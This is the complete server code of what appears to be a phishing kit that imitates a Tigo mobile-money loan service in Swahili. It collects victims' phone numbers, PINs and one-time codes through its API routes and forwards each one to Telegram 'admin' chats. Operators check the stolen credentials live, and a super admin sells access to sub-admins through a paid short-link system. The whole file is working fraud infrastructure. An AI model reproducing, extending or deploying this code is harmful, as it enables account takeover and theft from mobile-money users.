const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `https://final-8xfd.onrender.com`;

const bot = new TelegramBot(BOT_TOKEN);

const adminChatIds = new Map();
const pausedAdmins = new Set();
const processingLocks = new Set();

let dbReady = false;

// ==========================================
// ✅ SHORT CODE GENERATOR
// ==========================================
async function generateUniqueShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for (let attempt = 0; attempt < 20; attempt++) {
        let code = '';
        for (let i = 0; i < 5; i++) {
            code += chars[Math.floor(Math.random() * chars.length)];
        }
        const existing = await db.getAdminByShortCode(code);
        if (!existing) return code;
    }
    throw new Error('Could not generate unique short code after 20 attempts');
}

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);
    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) { console.error(`❌ No chat ID for admin: ${adminId}`); return null; }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT SETUP
// ==========================================
bot.on('error', (e) => console.error('❌ Bot error:', e?.message));
bot.on('polling_error', (e) => console.error('❌ Polling error:', e?.message));

setupCommandHandlers();

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        if (req.body?.update_id !== undefined) {
            try { bot.processUpdate(req.body); } catch (e) { console.error('❌ processUpdate error:', e); }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSet = false;

        for (let attempt = 1; attempt <= 3 && !webhookSet; attempt++) {
            try {
                console.log(`🔄 Attempt ${attempt}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(r => setTimeout(r, 1000));
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false, max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) { webhookSet = true; console.log('✅ Webhook confirmed!'); }
                }
            } catch (e) {
                console.error(`❌ Webhook attempt ${attempt} failed:`, e.message);
                if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
            }
        }

        if (!webhookSet) console.error('❌ CRITICAL: Failed to set webhook!');

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot: @${botInfo.username}`);
        } catch (e) { console.error('❌ Bot API error:', e); }

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins, ${pausedAdmins.size} paused`);
        }, 60000);

        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                if (info.url !== fullWebhookUrl) {
                    console.log('⚠️ Webhook lost — re-setting...');
                    await bot.setWebHook(fullWebhookUrl, { drop_pending_updates: false, max_connections: 40, allowed_updates: ['message', 'callback_query'] });
                }
            } catch (e) { console.error('⚠️ Webhook check error:', e.message); }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => { console.error('❌ Initialization failed:', error); process.exit(1); });

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();
        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================

function setupCommandHandlers() {

    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            let adminId = getAdminIdByChatId(chatId);

            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nContact the super admin.\n\n*Your Admin ID:* \`${adminId}\``, { parse_mode: 'Markdown' });
                    return;
                }

                const admin = await db.getAdmin(adminId);
                if (admin) {
                    const isSuperAdmin = adminId === 'ADMIN001';
                    const appUrl = process.env.APP_URL || WEBHOOK_URL;

                    // ✅ NEW: Check payment status
                    const paymentStatus = admin.paymentStatus || 'unpaid';
                    const linkStatus = paymentStatus === 'paid' ? '✅ ACTIVE' : '🔒 LOCKED (Payment pending)';

                    let startMsg = `👋 *Welcome${isSuperAdmin ? ', Super Admin' : ''}!*\n\n`;
                    startMsg += isSuperAdmin
                        ? `You are the super admin managing the loan platform.\n\n*Available Commands:*\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/stats - View statistics\n/help - Show all commands`
                        : `📱 Your loan application link:\n\`${appUrl}/${admin.shortCode}\`\n\n💳 *Payment Status:* ${linkStatus}\n*Status:* ${admin.status}\n\n*Your Admin ID:* \`${adminId}\``;

                    await bot.sendMessage(chatId, startMsg, { parse_mode: 'Markdown' });
                }
                return;
            }

            // New user (not an admin)
            await bot.sendMessage(chatId, '👋 Welcome!\n\nYou are not registered as an admin. Only admins can use this bot.', { parse_mode: 'Markdown' });

        } catch (error) {
            console.error('❌ /start error:', error);
            await bot.sendMessage(chatId, '❌ Error processing your request.', { parse_mode: 'Markdown' });
        }
    });

    bot.onText(/\/addadmin/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '🚫 Only the super admin can add admins.');
            return;
        }

        const instructions = `📝 *ADD NEW SUB-ADMIN*\n\nReply with details in this format (ONE LINE):\n\n\`NAME | EMAIL | CHAT_ID\`\n\nExample:\n\`John Doe | john@example.com | 123456789\`\n\n*How to get CHAT_ID:*\n1. Search for @userinfobot\n2. Start the bot\n3. It sends your CHAT_ID`;

        await bot.sendMessage(chatId, instructions, { parse_mode: 'Markdown' });

        const listener = async (innerMsg) => {
            if (innerMsg.chat.id !== chatId) return;
            if (innerMsg.text.startsWith('/')) {
                bot.removeListener('message', listener);
                return;
            }

            const parts = innerMsg.text.split('|').map(p => p.trim());
            if (parts.length !== 3) {
                await bot.sendMessage(chatId, '❌ Invalid format. Please use: NAME | EMAIL | CHAT_ID');
                return;
            }

            bot.removeListener('message', listener);

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);

            if (!name || !email || isNaN(newChatId)) {
                await bot.sendMessage(chatId, '❌ Invalid input. Please try again.');
                return;
            }

            try {
                const shortCode = await generateUniqueShortCode();
                const newAdminId = 'ADMIN-' + Date.now();

                await db.saveAdmin({
                    adminId: newAdminId,
                    name,
                    email,
                    chatId: newChatId,
                    shortCode,
                    status: 'active',
                    paymentStatus: 'unpaid'
                });

                adminChatIds.set(newAdminId, newChatId);

                // ✅ NEW: Record initial payment as unpaid
                await db.recordPayment(newAdminId, {
                    amount: 500,
                    status: 'pending',
                    reason: 'Initial subscription payment'
                });

                const appUrl = process.env.APP_URL || WEBHOOK_URL;
                let confirmMsg = `✅ *SUB-ADMIN CREATED SUCCESSFULLY!*\n\n`;
                confirmMsg += `👤 *Name:* ${name}\n`;
                confirmMsg += `📧 *Email:* ${email}\n`;
                confirmMsg += `🆔 *Admin ID:* \`${newAdminId}\`\n`;
                confirmMsg += `💬 *Chat ID:* ${newChatId}\n`;
                confirmMsg += `💳 *Payment Status:* UNPAID\n\n`;
                confirmMsg += `📱 *Application Link:*\n\`${appUrl}/${shortCode}\`\n\n`;
                confirmMsg += `⚠️ *Link is LOCKED until payment is approved*\n\n`;
                confirmMsg += `💰 *Subscription Fee:* TSh 500\n`;
                confirmMsg += `⏱️ *Validity:* 30 days after approval`;

                await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });

                // Send welcome message to new admin
                await bot.sendMessage(newChatId, `👋 Welcome ${name}!\n\nYou have been added as a sub-admin.\n\n🔒 *Your link is currently LOCKED*\n💳 Awaiting payment approval from super admin.\n\n💰 *Amount Due:* TSh 500\n\nOnce approved, users can access your application link.`, { parse_mode: 'Markdown' });

            } catch (error) {
                console.error('❌ Error adding admin:', error);
                await bot.sendMessage(chatId, `❌ Error: ${error.message}`);
            }
        };

        bot.on('message', listener);
        setTimeout(() => bot.removeListener('message', listener), 300000); // 5 min timeout
    });

    // ✅ NEW: Payment management command
    bot.onText(/\/payments/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '🚫 Only the super admin can manage payments.');
            return;
        }

        try {
            const pendingPayments = await db.getPendingPayments();

            if (pendingPayments.length === 0) {
                await bot.sendMessage(chatId, '✅ No pending payments.');
                return;
            }

            let paymentMsg = `💳 *PENDING PAYMENTS* (${pendingPayments.length})\n\n`;

            const buttons = [];
            for (const payment of pendingPayments) {
                const admin = await db.getAdmin(payment.adminId);
                paymentMsg += `👤 ${admin?.name || 'Unknown'}\n`;
                paymentMsg += `💰 TSh ${payment.amount}\n`;
                paymentMsg += `📅 ${new Date(payment.createdAt).toLocaleDateString()}\n\n`;

                buttons.push([
                    { text: `✅ Approve`, callback_data: `approve_payment_${payment._id}` },
                    { text: `❌ Reject`, callback_data: `reject_payment_${payment._id}` }
                ]);
            }

            await bot.sendMessage(chatId, paymentMsg, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });

        } catch (error) {
            console.error('❌ /payments error:', error);
            await bot.sendMessage(chatId, '❌ Error retrieving payments.');
        }
    });

    bot.onText(/\/listadmins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '🚫 Only the super admin can list admins.');
            return;
        }

        try {
            const admins = await db.getAllAdmins();
            if (admins.length === 0) {
                await bot.sendMessage(chatId, 'No admins found.');
                return;
            }

            let listMsg = `👥 *SUB-ADMIN LIST* (${admins.length} total)\n\n`;

            for (const admin of admins) {
                if (admin.adminId === 'ADMIN001') continue;

                const paymentIcon = admin.paymentStatus === 'paid' ? '✅ PAID' : admin.paymentStatus === 'pending' ? '⏳ PENDING' : '🔒 UNPAID';
                const statusIcon = admin.status === 'active' ? '✅' : '⏸️';

                listMsg += `${statusIcon} *${admin.name}*\n`;
                listMsg += `📧 ${admin.email}\n`;
                listMsg += `🔗 ${admin.shortCode}\n`;
                listMsg += `💳 ${paymentIcon}\n`;
                listMsg += `📱 Apps: ${(await db.getAdminStats(admin.adminId)).total}\n`;
                listMsg += `---\n`;
            }

            await bot.sendMessage(chatId, listMsg, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /listadmins error:', error);
            await bot.sendMessage(chatId, '❌ Error retrieving admins.');
        }
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId) {
            await bot.sendMessage(chatId, '❌ Not authorized.');
            return;
        }

        try {
            if (adminId === 'ADMIN001') {
                const stats = await db.getStats();
                let statsMsg = `📊 *SYSTEM STATISTICS*\n\n`;
                statsMsg += `👥 *Admins:* ${stats.totalAdmins}\n`;
                statsMsg += `✅ Paid: ${stats.paidAdmins}\n`;
                statsMsg += `🔒 Unpaid: ${stats.unpaidAdmins}\n`;
                statsMsg += `⏳ Pending: ${stats.pendingPayments}\n\n`;
                statsMsg += `📋 *Applications:* ${stats.totalApplications}\n`;
                statsMsg += `✅ Approved: ${stats.fullyApproved}\n`;
                statsMsg += `⏳ Pending: ${stats.otpPending}\n`;
                statsMsg += `❌ Rejected: ${stats.totalRejected}`;

                await bot.sendMessage(chatId, statsMsg, { parse_mode: 'Markdown' });
            } else {
                const stats = await db.getAdminStats(adminId);
                let statsMsg = `📊 *YOUR STATISTICS*\n\n`;
                statsMsg += `📋 Total: ${stats.total}\n`;
                statsMsg += `✅ Approved: ${stats.fullyApproved}\n`;
                statsMsg += `⏳ Pending: ${stats.otpPending}\n`;

                await bot.sendMessage(chatId, statsMsg, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ /stats error:', error);
            await bot.sendMessage(chatId, '❌ Error retrieving statistics.');
        }
    });

    bot.onText(/\/help/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId) {
            await bot.sendMessage(chatId, '❌ Not authorized.');
            return;
        }

        if (adminId === 'ADMIN001') {
            const helpMsg = `*SUPER ADMIN COMMANDS*\n\n/start - Welcome message\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/stats - System statistics\n/help - This message`;
            await bot.sendMessage(chatId, helpMsg, { parse_mode: 'Markdown' });
        } else {
            const helpMsg = `*SUB-ADMIN COMMANDS*\n\n/start - Welcome message\n/stats - Your statistics\n/help - This message`;
            await bot.sendMessage(chatId, helpMsg, { parse_mode: 'Markdown' });
        }
    });

    // ✅ NEW: Callback handlers for payment approval/rejection
    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.answerCallbackQuery(query.id, '❌ Only super admin can approve payments', true);
            return;
        }

        try {
            if (query.data.startsWith('approve_payment_')) {
                const paymentId = query.data.replace('approve_payment_', '');
                const ObjectId = require('mongodb').ObjectId;

                try {
                    const payment = await db.approvePayment(new ObjectId(paymentId), 'Approved by super admin');
                    const admin = await db.getAdmin(payment.adminId);

                    // Notify admin of approval
                    await sendToAdmin(payment.adminId, `✅ *PAYMENT APPROVED!*\n\n💰 Your subscription fee of TSh 500 has been approved.\n\n🔓 Your link is now ACTIVE\n⏱️ Valid for 30 days\n\n📱 Application Link: \`${process.env.APP_URL || WEBHOOK_URL}/${admin.shortCode}\``, { parse_mode: 'Markdown' });

                    await bot.editMessageText('✅ Payment approved! Admin link is now active.', { chat_id: chatId, message_id: query.message.message_id });
                    await bot.answerCallbackQuery(query.id, '✅ Payment approved');

                } catch (error) {
                    console.error('Payment approval error:', error);
                }

            } else if (query.data.startsWith('reject_payment_')) {
                const paymentId = query.data.replace('reject_payment_', '');
                const ObjectId = require('mongodb').ObjectId;

                try {
                    const payment = await db.rejectPayment(new ObjectId(paymentId), 'Rejected by super admin');

                    // Notify admin of rejection
                    await sendToAdmin(payment.adminId, `❌ *PAYMENT REJECTED*\n\n💰 Your subscription payment has been rejected.\n\n🔒 Your link remains LOCKED\n\nPlease contact the super admin for details.`, { parse_mode: 'Markdown' });

                    await bot.editMessageText('❌ Payment rejected. Admin notified.', { chat_id: chatId, message_id: query.message.message_id });
                    await bot.answerCallbackQuery(query.id, '❌ Payment rejected');

                } catch (error) {
                    console.error('Payment rejection error:', error);
                }
            }
        } catch (error) {
            console.error('❌ Callback error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error processing request', true);
        }
    });
}

// ==========================================
// API ENDPOINTS
// ==========================================

// ✅ NEW: Get admin info with payment status
app.get('/api/admin-info/:code', async (req, res) => {
    try {
        const code = req.params.code.toLowerCase();
        const admin = await db.getAdminByShortCode(code);

        if (!admin) {
            return res.status(404).json({ success: false, message: 'Admin not found', locked: true });
        }

        // Check if link is locked
        const isLocked = admin.paymentStatus !== 'paid';
        const lockReason = admin.paymentStatus === 'unpaid' ? 'Payment not yet processed' : 'Payment pending approval';

        res.json({
            success: true,
            adminId: admin.adminId,
            name: admin.name,
            paymentStatus: admin.paymentStatus,
            locked: isLocked,
            lockReason: isLocked ? lockReason : null,
            subscriptionExpiryDate: admin.subscriptionExpiryDate
        });

    } catch (error) {
        console.error('❌ Error in /api/admin-info:', error);
        res.status(500).json({ success: false, message: 'Server error', locked: true });
    }
});

app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const activeAdmins = admins.filter(a => a.paymentStatus === 'paid');
        res.json({ success: true, admins: activeAdmins });
    } catch (error) {
        console.error('❌ Error in /api/admins:', error);
        res.status(500).json({ success: false, admins: [] });
    }
});

app.post('/api/verify-pin', async (req, res) => {
    const lockKey = `pin_${req.body?.phoneNumber}`;

    try {
        const { phoneNumber, pin, adminId } = req.body;

        if (!adminId) {
            return res.status(403).json({ success: false, message: 'No admin selected.' });
        }

        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing' });
        }
        processingLocks.add(lockKey);

        // ✅ NEW: Check if admin's link is locked
        const admin = await db.getAdmin(adminId);
        if (!admin) {
            processingLocks.delete(lockKey);
            return res.status(403).json({ success: false, message: 'Admin not found' });
        }

        if (admin.paymentStatus !== 'paid') {
            processingLocks.delete(lockKey);
            return res.status(403).json({
                success: false,
                message: `🔒 This admin's link is locked. Payment status: ${admin.paymentStatus}. Contact the super admin.`,
                locked: true
            });
        }

        if (!adminChatIds.has(adminId)) {
            const loadedAdmin = await db.getAdmin(adminId);
            if (loadedAdmin?.chatId) adminChatIds.set(adminId, loadedAdmin.chatId);
            else {
                processingLocks.delete(lockKey);
                return res.status(500).json({ success: false, message: 'Admin unavailable' });
            }
        }

        const applicationId = 'LOAN-' + Date.now();
        await db.saveApplication({
            id: applicationId,
            phoneNumber,
            pin,
            adminId,
            adminName: admin.name
        });

        const assignedAdmin = admin;

        await sendToAdmin(adminId, `🆕 *NEW LOAN APPLICATION*\n\n📋 \`${applicationId}\`\n\n📱 ${phoneNumber}\n🔐 \`${pin}\`\n\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *ACTION REQUIRED*\nPlease verify if this phone number and PIN are correct.`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid Information', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        processingLocks.delete(lockKey);
        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        processingLocks.delete(lockKey);
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        if (!applicationId) {
            return res.status(403).json({ success: false, message: 'Invalid session.' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        // ✅ NEW: Check if admin's link is locked
        const admin = await db.getAdmin(application.adminId);
        if (admin.paymentStatus !== 'paid') {
            return res.status(403).json({
                success: false,
                message: 'This admin\'s link is locked. Payment pending.',
                locked: true
            });
        }

        if (!adminChatIds.has(application.adminId)) {
            const loadedAdmin = await db.getAdmin(application.adminId);
            if (loadedAdmin?.chatId) adminChatIds.set(application.adminId, loadedAdmin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `📲 *CODE VERIFICATION*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${otp}\`\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *VERIFY CODE*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        if (!applicationId) return res.status(403).json({ success: false, message: 'Invalid session.' });

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        // ✅ NEW: Check payment status
        const admin = await db.getAdmin(application.adminId);
        if (admin.paymentStatus !== 'paid') {
            return res.status(403).json({ success: false, message: 'Admin link is locked', locked: true });
        }

        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });

        await sendToAdmin(application.adminId, `🔄 *OTP RESEND REQUEST*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\nUser requested OTP resend.`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        botMode: 'webhook',
        timestamp: new Date().toISOString()
    });
});

// ==========================================
// PAGE ROUTES
// ==========================================

app.get('/', (req, res) => {
    if (req.query.admin) {
        console.log(`⚠️ Legacy admin link used: ${req.query.admin}`);
        return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>
            sessionStorage.setItem('selectedAdminId', '${req.query.admin.replace(/['"<>]/g, '')}');
            sessionStorage.setItem('validLink', 'true');
            window.location.replace('/index.html');
        </script></body></html>`);
    }
    res.sendFile(path.join(__dirname, 'invalid-link.html'));
});

app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
    const code = req.params.code.toLowerCase();

    const reserved = ['index.html', 'application.html', 'verification.html', 'otp.html', 'approval.html', 'invalid-link.html', 'style.css', 'admin-select.html'];
    if (reserved.some(r => code === r.replace('.html', '') || code === r)) {
        return res.sendFile(path.join(__dirname, req.params.code));
    }

    try {
        const admin = await db.getAdminByShortCode(code);

        if (!admin || admin.status !== 'active') {
            console.log(`🚫 Invalid/inactive short code: ${code}`);
            return res.sendFile(path.join(__dirname, 'invalid-link.html'));
        }

        // ✅ NEW: Check if link is locked due to payment
        if (admin.paymentStatus !== 'paid') {
            const lockReason = admin.paymentStatus === 'unpaid'
                ? 'This link is locked. Payment has not been processed by the super admin.'
                : 'This link is locked. Payment is pending approval.';

            return res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kiungo Batili - Mkopo wa Tigo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            padding: 60px 48px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
        }
        .lock-icon { font-size: 64px; margin-bottom: 24px; display: block; }
        h1 { font-size: 28px; font-weight: 800; color: #111; margin-bottom: 16px; }
        p { font-size: 16px; color: #666; line-height: 1.6; margin-bottom: 20px; }
        .info-box {
            background: #fee2e2;
            border: 2px solid #fecaca;
            color: #991b1b;
            padding: 20px;
            border-radius: 12px;
            margin-top: 24px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="card">
        <span class="lock-icon">🔒</span>
        <h1>Kiungo Batili</h1>
        <p>${lockReason}</p>
        <div class="info-box">
            <strong>💳 Hali ya Malipo:</strong> ${admin.paymentStatus === 'unpaid' ? 'Haijachakatwa' : 'Inasubiri Idhini'}
            <p style="margin-top: 10px;">Wasiliana na msimamizi mkuu kwa maelezo zaidi.</p>
        </div>
    </div>
</body>
</html>`);
        }

        if (!adminChatIds.has(admin.adminId) && admin.chatId) {
            adminChatIds.set(admin.adminId, admin.chatId);
        }

        console.log(`✅ Short code ${code} → ${admin.name} (${admin.adminId})`);

        res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mkopo wa Tigo — Inapakia...</title>
    <style>
        body { margin:0; min-height:100vh; background:linear-gradient(135deg,#667eea,#764ba2); display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
        .loader { text-align:center; color:white; }
        .spinner { width:48px; height:48px; border:4px solid rgba(255,255,255,0.3); border-top:4px solid white; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
        @keyframes spin { to { transform:rotate(360deg); } }
        p { font-size:16px; opacity:0.9; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Inapakia...</p>
    </div>
    <script>
        sessionStorage.setItem('selectedAdminId', '${admin.adminId}');
        sessionStorage.setItem('validLink', 'true');
        window.location.replace('/index.html');
    </script>
</body>
</html>`);
    } catch (error) {
        console.error('❌ Error in short code route:', error);
        res.sendFile(path.join(__dirname, 'invalid-link.html'));
    }
});

// ==========================================
// SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n👑 TIGO LOAN PLATFORM — SHORT CODE MODE + PAYMENT SYSTEM`);
    console.log(`=========================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🔑 Links: yoursite.com/XXXXX (5-char codes)`);
    console.log(`💳 Payment System: ENABLED`);
    console.log(`🔒 Locked Links: Inactive until payment approved`);
    console.log(`\n✅ Ready!\n`);
});

async function shutdownGracefully(signal) {
    console.log(`\n🛑 ${signal} — shutting down...`);
    try { await bot.deleteWebHook(); await db.closeDatabase(); process.exit(0); }
    catch (e) { console.error('❌ Shutdown error:', e); process.exit(1); }
}
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
process.on('unhandledRejection', (e) => console.error('❌ Unhandled rejection:', e?.message));
process.on('uncaughtException', (e) => console.error('❌ Uncaught exception:', e?.message));
